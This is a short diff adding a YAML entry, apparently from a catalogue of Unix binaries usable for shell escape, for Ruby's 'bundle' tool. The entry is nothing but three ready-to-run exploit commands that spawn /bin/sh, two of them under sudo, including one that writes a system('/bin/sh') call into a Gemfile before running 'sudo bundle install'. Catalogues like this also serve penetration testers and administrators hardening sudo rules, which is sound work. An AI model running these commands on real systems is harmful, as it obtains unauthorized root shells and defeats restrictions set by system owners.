@@ -1,0 +1,6 @@
+name: bundle
+binary_path: /usr/bin/bundle
+exploit_cmds:
+- BUNDLE_GEMFILE=x /usr/bin/bundle exec /bin/sh
+- touch Gemfile && sudo /usr/bin/bundle exec /bin/sh
+- echo 'system("/bin/sh")' >Gemfile && sudo /usr/bin/bundle install
